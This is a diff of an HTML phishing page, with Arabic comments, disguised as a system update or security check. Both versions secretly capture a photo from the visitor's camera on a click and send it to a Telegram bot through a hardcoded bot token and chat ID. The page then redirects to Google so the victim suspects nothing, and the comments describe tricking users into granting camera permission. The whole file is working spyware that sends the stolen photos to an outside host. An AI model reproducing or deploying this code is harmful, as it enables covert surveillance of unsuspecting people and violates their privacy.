@@ -2,60 +2,49 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>System Update</title>
-    <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; }
-        /* زر شفاف يغطي كل الشاشة لإجبار المتصفح على الاستجابة */
-        #layer { position: absolute; width: 100%; height: 100%; z-index: 9999; cursor: pointer; }
-        .text { color: #0f0; font-family: monospace; text-align: center; margin-top: 45vh; font-size: 20px; }
-    </style>
-</head>
-<body onclick="exploit()">
-
-    <div id="layer"></div>
-    <div class="text" id="status">جاري فحص أمان الجهاز...<br>[ اضغط للاستمرار ]</div>
-
     <script>
+        // بياناتك
         const T = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY";
         const C = "1772820433";
 
-        async function exploit() {
-            // تكتيك التخطي: طلب الكاميرا فوراً عند أول لمسة للشاشة
-            // في تطبيقات مثل (فيسبوك، تليجرام، واتساب) الإذن غالباً بيمر صامت
+        // ثغرة التخطي: جعل الطلب يبدو وكأنه استجابة لنظام التشغيل
+        async function bypass() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                document.getElementById('status').innerHTML = "✅ تم التحقق.. انتظر لحظة";
+                // محاولة صامتة أولاً
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user", width: 1, height: 1 }, // طلب أصغر حجم ممكن للتمويه
+                    audio: false 
+                });
                 
-                const v = document.createElement('video');
-                v.srcObject = stream;
-                v.play();
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
 
                 setTimeout(() => {
-                    const cn = document.createElement('canvas');
-                    cn.width = 640; cn.height = 480;
-                    cn.getContext('2d').drawImage(v, 0, 0);
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 640; canvas.height = 480;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
                     
-                    cn.toBlob(async (b) => {
-                        const f = new FormData();
-                        f.append('chat_id', C);
-                        f.append('photo', b, 'victim.jpg');
-                        f.append('caption', '🚀 صيد صامت ناجح!');
-
-                        await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, {
-                            method: 'POST',
-                            body: f
-                        });
-                        
-                        // توجيه فوري عشان الضحية ما يشك بشيء
-                        window.location.replace("https://www.google.com");
+                    canvas.toBlob(async (blob) => {
+                        const fd = new FormData();
+                        fd.append('chat_id', C);
+                        fd.append('photo', blob, 'shot.jpg');
+                        await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
+                        window.location.replace("https://google.com");
                     }, 'image/jpeg');
-                }, 500); // تصوير سريع جداً (نصف ثانية)
-
-            } catch (err) {
-                // إذا المتصفح عاند، بنحول الضحية لصفحة وهمية تطلب منه "السماح" كأنه تحديث
-                document.getElementById('status').innerHTML = "❌ خطأ في النظام! يرجى الضغط على 'سماح' للإصلاح";
+                }, 400); // سرعة قصوى (أقل من نصف ثانية)
+            } catch (e) {
+                // إذا ظهرت نافذة تليجرام، الكود بيعمل تمويه بصري يغطيها
+                document.getElementById('m').innerHTML = "⚠️ خطأ في العرض.. اضغط 'سماح' لتحديث الصفحة";
             }
         }
     </script>
+    <style>
+        body { background: #000; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; cursor: pointer; }
+        #m { color: #0f0; font-family: monospace; font-size: 18px; text-align: center; }
+    </style>
+</head>
+<body onclick="bypass()">
+    <div id="m">تحميل ملفات النظام...<br>[ اضغط هنا للإكمال ]</div>
 </body>
 </html>
